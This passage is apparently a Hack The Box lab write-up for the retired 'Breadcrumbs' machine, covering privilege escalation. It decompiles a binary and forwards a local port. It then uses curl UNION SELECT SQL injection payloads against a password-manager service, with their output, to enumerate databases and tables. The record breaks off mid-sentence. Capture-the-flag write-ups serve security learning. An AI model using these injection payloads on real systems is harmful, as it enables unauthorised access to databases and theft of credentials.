# Privilege escalation to root
## Found `Krypter_Linux` file in development folder
```powershell
development@BREADCRUMBS C:\>cd Development

development@BREADCRUMBS C:\Development>dir
 Volume in drive C has no label.
 Volume Serial Number is 7C07-CD3A

 Directory of C:\Development

01/15/2021  05:03 PM    <DIR>          .
01/15/2021  05:03 PM    <DIR>          ..
11/29/2020  04:11 AM            18,312 Krypter_Linux
               1 File(s)         18,312 bytes
               2 Dir(s)   6,503,538,688 bytes free

development@BREADCRUMBS C:\Development>
```
## Transferring `Krypter_Linux` file to kali and analyzing in ghidra
Transferred `Krypter_Linux` file to kali via impacker smbserver
![[Pasted image 20210730205822.png]]
```C
undefined8 main(int param_1,long param_2)

{
  size_t sVar1;
  basic_ostream *this;
  ulong uVar2;
  basic_string local_58 [44];
  undefined4 local_2c;
  long local_28;
  int local_20;
  int local_1c;
  
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string();
                    /* try { // try from 00101263 to 001013cf has its CatchHandler @ 001013e5 */
  local_28 = curl_easy_init();
  puts(
      "Krypter V1.2\n\nNew project by Juliette.\nNew features added weekly!\nWhat to expect next update:\n\t- Windows version with GUI support\n\t- Get password from cloud and AUTOMATICALLY decrypt!\n***\n"
      );
  if (param_1 == 2) {
    local_1c = 0;
    local_20 = 0;
    while( true ) {
      uVar2 = SEXT48(local_20);
      sVar1 = strlen(*(char **)(param_2 + 8));
      if (sVar1 <= uVar2) break;
      local_1c = local_1c + *(char *)((long)local_20 + *(long *)(param_2 + 8));
      local_20 = local_20 + 1;
    }
    if (local_1c == 0x641) {
      if (local_28 != 0) {
        puts("Requesting decryption key from cloud...\nAccount: Administrator");
        curl_easy_setopt(local_28,0x2712,"http://passmanager.htb:1234/index.php");
        curl_easy_setopt(local_28,0x271f,"method=select&username=administrator&table=passwords");
        curl_easy_setopt(local_28,0x4e2b,WriteCallback);
        curl_easy_setopt(local_28,0x2711,local_58);
        local_2c = curl_easy_perform(local_28);
        curl_easy_cleanup(local_28);
        puts("Server response:\n\n");
        this = std::operator<<((basic_ostream *)std::cout,local_58);
        std::basic_ostream<char,std::char_traits<char>>::operator<<
                  ((basic_ostream<char,std::char_traits<char>> *)this,
                   std::endl<char,std::char_traits<char>>);
      }
    }
    else {
      puts("Incorrect master key");
    }
  }
  else {
    puts("No key supplied.\nUSAGE:\n\nKrypter <key>");
  }
  std::__cxx11::basic_string<char,std::char_traits<char>,std::allocator<char>>::~basic_string
            ((basic_string<char,std::char_traits<char>,std::allocator<char>> *)local_58);
  return 0;
}
```
![[Pasted image 20210730210555.png]]
This pogram needs two arguments one is file itself and other is key. The program adds bytes of key together , if they does not equal `0x641` (1601 in decimal) , then it gives error `Incorrect master key`. This program also makes curl requests to `http://passmanager.htb:1234/index.php?method=select&username=administrator&table=passwords`, which indicates it is some type of password manager.
## Found port 1234 open on 127.0.0.1 on breadcrumbs machine
![[Pasted image 20210730211311.png]]
## Forwarding this port 1234 open on 127.0.0.1 to kali via chisel
![[Pasted image 20210730211556.png]]
## Adding passmanager.htb to /etc/hosts file
![[Pasted image 20210730211834.png]]
## Making curl request to service on port 1234 gives AES key
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator&table=passwords"

selectarray(1) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
}
```
## Discovering SQL injection on service running on port 1234
![[Pasted image 20210730212334.png]]
## Exploiting SQL injection on service running on port 1234 to get creds of administrator 
Knowing database name via command `curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select SCHEMA_NAME from INFORMATION_SCHEMA.schemata-- -&table=passwords"`
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select SCHEMA_NAME from INFORMATION_SCHEMA.schemata-- -&table=passwords"

selectarray(3) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(18) "information_schema"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(5) "bread"
  }
}
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯
```
Knowing table names in database `bread` via command `curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select TABLE_NAME from INFORMATION_SCHEMA.tables-- -&table=passwords"`
```bash
~/Dropbox/Documents/htb/boxes/RETIRED_BOXES/breadcrumbs_retired ❯ curl "http://passmanager.htb:1234/index.php" -d "method=select&username=administrator' union select TABLE_NAME from INFORMATION_SCHEMA.tables-- -&table=passwords"

selectarray(82) {
  [0]=>
  array(1) {
    ["aes_key"]=>
    string(16) "k19D193j.<19391("
  }
  [1]=>
  array(1) {
    ["aes_key"]=>
    string(11) "ALL_PLUGINS"
  }
  [2]=>
  array(1) {
    ["aes_key"]=>
    string(16) "APPLICABLE_ROLES"
  }
  [3]=>
  array(1) {
    ["aes_key"]=>
    string(14) "CHARACTER_SETS"
  }
  [4]=>
  array(1) {
    ["aes_key"]=>
    string(17) "CHECK_CONSTRAINTS"
  }
  [5]=>
  array(1) {
    ["aes_key"]=>
    string(10) "COLLATIONS"
  }
  [6]=>
  array(1) {
    ["aes_key"]=>
    string(37) "COLLATION_CHARACTER_SET_APPLICABILITY"
  }
  [7]=>
  array(1) {
    ["aes_key"]=>
    string(7) "COLUMNS"
  }
  [8]=>
  array(1) {
    ["aes_key"]=>
    string(17) "COLUMN_PRIVILEGES"
  }
  [9]=>
  array(1) {
    ["aes_key"]=>
    string(13) "ENABLED_ROLES"
  }
  [10]=>
  array(1) {
    ["aes_key"]=>
    string(7) "ENGINES"
  }
  [11]=>
  array(1) {
    ["aes_key"]=>
    string(6) "EVENTS"
  }
  [12]=>
  array(1) {
    ["aes_key"]=>
    string(5) "FILES"
  }
  [13]=>
  array(1) {
    ["aes_key"]=>
    string(13) "GLOBAL_STATUS"
  }
  [14]=>
  array(1) {
    ["aes_key"]=>
    string(16) "GLOBAL_VARIABLES"
  }
  [15]=>
  array(1) {
    ["aes_key"]=>
    string(10) "KEY_CACHES"
  }
  [16]=>
  array(1) {
    ["aes_key"]=>
    string(16) "KEY_COLUMN_USAGE"
  }
  [17]=>
  array(1) {
    ["aes_key"]=>
    string(15) "OPTIMIZER_TRACE"
  }
  [18]=>
  array(1) {
    ["aes_key"]=>
    string(10) "PARAMETERS"
  }
  [19]=>
  array(1) {
    ["aes_key"]=>
    string(10) "PARTITIONS"
  }
  [20]=>
  array(1) {
    ["aes_key"]=>
    string(7) "PLUGINS"
  }
  [21]=>
  array(1) {
    ["aes_key"]=>
    string(11) "PROCESSLIST"
  }
  [22]=>
  array(1) {
    ["aes_key"]=>
    string(9) "PROFILING"
  }
  [23]=>
  array(1) {
    ["aes_key"]=>
    string(23) "REFERENTIAL_CONSTRAINTS"
  }
  [24]=>
  array(1) {
    ["aes_key"]=>
    string(8) "ROUTINES"
  }
  [25]=>
  array(1) {
    ["aes_key"]=>
    string(8) "SCHEMATA"
  }
  [26]=>
  array(1) {
    ["aes_key"]=>
    string(17) "SCHEMA_PRIVILEGES"
  }
  [27]=>
  array(1) {
    ["aes_key"]=>
    string(14) "SESSION_STATUS"
  }
  [28]=>
  array(1) {
    ["aes_key"]=>
    string(17) "SESSION_VARIABLES"
  }
  [29]=>
  array(1) {
    ["aes_key"]=>
    string(10) "STATISTICS"
  }
  [30]=>
  array(1) {
    ["aes_key"]=>
    string(16) "SYSTEM_VARIABLES"
  }
  [31]=>
  array(1) {
    ["aes_key"]=>
    string(6) "TABLES"
  }
  [32]=>
  array(1) {
    ["aes_key"]=>
    string(11) "TABLESPACES"
  }
  [33]=>
  array(1) {
    ["aes_key"]=>
    string(17) "TABLE_CONSTRAINTS"
  }
  [34]=>
  array(1) {
    ["aes_key"]=>
    string(16) "TABLE_PRIVILEGES"
  }
  [35]=>
  array(1) {
    ["aes_key"]=>
    string(8) "TRIGGERS"
  }
  [36]=>
  array(1) {
    ["aes_key"]=>
    string(15) "USER_PRIVILEGES"
  }
  [37]=>
  array(1) {
    ["aes_key"]=>
    string(5) "VIEWS"
  }
  [38]=>
  array(1) {
    ["aes_key"]=>
    string(17) "CLIENT_STATISTICS"
  }
  [39]=>
  array(1) {
    ["aes_key"]=>
    string(16) "INDEX_STATISTICS"
  }
  [40]=>
  array(1) {
    ["aes_key"]=>
    string(20) "INNODB_SYS_DATAFILES"
  }
  [41]=>
  array(1) {
    ["aes_key"]=>
    string(16) "GEOMETRY_COLUMNS"
  }
  [42]=>
  array(1) {
    ["aes_key"]=>
    string(21) "INNODB_SYS_TABLESTATS"
  }
  [43]=>
  array(1) {
    ["aes_key"]=>
    string(15) "SPATIAL_REF_SYS"
  }
  [44]=>
  array(1) {
    ["aes_key"]=>
    string(18) "INNODB_BUFFER_PAGE"
  }
  [45]=>
  array(1) {
    ["aes_key"]=>
    string(10) "INNODB_TRX"
  }
  [46]=>
  array(1) {
    ["aes_key"]=>
    string(20) "INNODB_CMP_PER_INDEX"
  }
  [47]=>
  array(1) {
    ["aes_key"]=>
    string(14) "INNODB_METRICS"
  }
  [48]=>
  array(1) {
    ["aes_key"]=>
    string(17) "INNODB_LOCK_WAITS"
  }
  [49]=>
  array(1) {
    ["aes_key"]=>
    string(10) "INNODB_CMP"
  }
  [50]=>
  array(1) {
    ["aes_key"]=>
    string(17) "THREAD_POOL_WAITS"
  }
  [51]=>
  array(1) {
    ["aes_key"]=>
    string(16) "INNODB_CMP_RESET"
  }
  [52]=>
  array(1) {
    ["aes_key"]=>
    string(18) "THREAD_POOL_QUEUES"
  }
  [53]=>
  array(1) {
    ["aes_key"]=>
    string(16) "TABLE_STATISTICS"
  }
  [54]=>
  array(1) {
    ["aes_key"]=>
    string(17) "INNODB_SYS_FIELDS"
  }
  [55]=>
  array(1) {
    ["aes_key"]=>
    string(22) "INNODB_BUFFER_PAGE_LRU"
  }
  [56]=>
  array(1) {
    ["aes_key"]=>
    string(12) "INNODB_LOCKS"
  }
  [57]=>
  array(1) {
    ["aes_key"]=>
    string(21) "INNODB_FT_INDEX_TABLE"
  }
  [58]=>
  array(1) {
    ["aes_key"]=>
    string(13) "INNODB_CMPMEM"
  }
  [59]=>
  array(1) {
    ["aes_key"]=>
    string(18) "THREAD_POOL_GROUPS"
  }
  [60]=>
  array(1) {
    ["aes_key"]=>
    string(26) "INNODB_CMP_PER_INDEX_RESET"
  }
  [61]=>
  array(1) {
    ["aes_key"]=>
    string(23) "INNODB_SYS_FOREIGN_COLS"
  }
  [62]=>
  array(1) {
    ["aes_key"]=>
    string(21) "INNODB_FT_INDEX_CACHE"
  }
  [63]=>
  array(1) {
    ["aes_key"]=>
    string(24) "INNODB_BUFFER_POOL_STATS"
  }
  [64]=>
  array(1) {
    ["aes_key"]=>
    string(23) "INNODB_FT_BEING_DELETED"
  }
  [65]=>
  array(1) {
    ["aes_key"]=>
    string(18) "INNODB_SYS_FOREIGN"
  }
  [66]=>
  array(1) {
    ["aes_key"]=>
    string(19) "INNODB_CMPMEM_RESET"
  }
  [67]=>
  array(1) {
    ["aes_key"]=>
    string(26) "INNODB_FT_DEFAULT_STOPWORD"
  }
  [68]=>
  array(1) {
    ["aes_key"]=>
    string(17) "INNODB_SYS_TABLES"
  }
  [69]=>
  array(1) {
    ["aes_key"]=>
    string(18) "INNODB_SYS_COLUMNS"
  }
  [70]=>
  array(1) {
    ["aes_key"]=>
    string(16) "INNODB_FT_CONFIG"
  }
  [71]=>
  array(1) {
    ["aes_key"]=>
    string(15) "USER_STATISTICS"
  }
  [72]=>
  array(1) {
    ["aes_key"]=>
    string(22) "INNODB_SYS_TABLESPACES"
  }
  [73]=>
  array(1) {
    ["aes_key"]=>
    string(18) "INNODB_SYS_VIRTUAL"
  }
  [74]=>
  array(1) {
    ["aes_key"]=>
    string(18) "INNODB_SYS_INDEXES"
  }
  [75]=>
  array(1) {
    ["aes_key"]=>
    string(26) "INNODB_SYS_SEMAPHORE_WAITS"
  }
  [76]=>
  array(1) {
    ["aes_key"]=>
    string(14) "INNODB_MUTEXES"
  }
  [77]=>
  array(1) {
    ["aes_key"]=>
    string(14) "user_variables"
  }
  [78]=>
  array(1) {
    ["aes_key"]=>
    string(29) "INNODB_TABLESPACES_ENCRYPTION"
  }
  [79]=>
  array(1) {
    ["aes_key"]=>
    string(17) "INNODB_FT_DELETED"
  }
  [80]=>
  array(1) {
    ["aes_key"]=>
    string(17) "THREAD_POOL_STATS"
  }
  [81]=>
  array(1) {
    ["aes_key"]=>
    string(9) "passwords"
  }
}
```
Determining colu